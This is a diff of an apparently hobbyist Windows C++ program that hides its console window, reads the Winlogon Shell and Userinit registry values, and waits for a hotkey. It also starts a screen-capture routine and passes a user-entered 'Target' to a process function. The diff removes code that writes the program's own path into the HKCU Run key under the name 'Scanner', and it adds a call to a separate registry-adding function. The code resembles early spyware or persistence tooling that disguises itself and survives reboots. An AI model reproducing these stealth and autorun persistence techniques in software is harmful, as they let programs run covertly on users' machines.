@@ -3,6 +3,9 @@
 #include <string>
 #include <tlhelp32.h>
 #include <format>
+#include "regAdd.h"
+#include "ProcessT.h"
+using namespace std;
 
 void chechWinRun() {
 	HKEY hKey;
@@ -39,40 +42,52 @@ void chechWinRun() {
 	);
 	
 	RegCloseKey(hKey);
-
-	wchar_t Path[260];
-	GetModuleFileNameW(NULL, Path, 260);
-
-	HKEY hRunKey;
-	RegOpenKeyExW(
-		HKEY_CURRENT_USER,
-		L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-		0,
-		KEY_SET_VALUE,
-		&hRunKey
-	);
-
-	RegSetValueExW(
-		hRunKey,
-		L"Scanner",
-		0,
-		REG_SZ,
-		(BYTE*)Path,
-		(lstrlenW(Path) + 1) * sizeof(wchar_t)
-	);
 	std::wstring report = std::format(L"Shell: {},\n Userinit: {}\n", shellByfer, UserinitByfer);
 	MessageBoxW(NULL, report.c_str(), L"Result", MB_OK | MB_ICONINFORMATION);
+}
 
+void screenshoot() {
+	int weight = GetSystemMetrics(SM_CXSCREEN);
+	int height = GetSystemMetrics(SM_CYSCREEN);
 
+	HDC hScreen = GetDC(NULL);
+	HDC hMemory = CreateCompatibleDC(hScreen);
+	HBITMAP hMap = CreateCompatibleBitmap(hScreen, weight, height);
+	SelectObject(hMemory, hMap);
+
+}
+
+void qasd() {
+	RegisterHotKey(
+		NULL,
+		1,
+		MOD_CONTROL | MOD_SHIFT,
+		0x58
+	);
+
+	MSG aqqw;
+	while (GetMessage(&aqqw, NULL, 0, 0)) {
+		if (aqqw.message == WM_HOTKEY) {
+			if (aqqw.wParam == 1) {
+				chechWinRun();
+				regeAdd();
+				break;
+			}
+		}
+	}
 }
 
 int main() {
 	HWND hConsole = GetConsoleWindow();
 	ShowWindow(hConsole, SW_HIDE);
 	setlocale(LC_ALL, "Russian");
+	qasd();
+	std::wstring target;
+	wcout << L"Target?";
+	wcin >> target;
+	processT(target);
 	
-	chechWinRun();
-	Sleep(5000);
+	
 
 
     return 0;
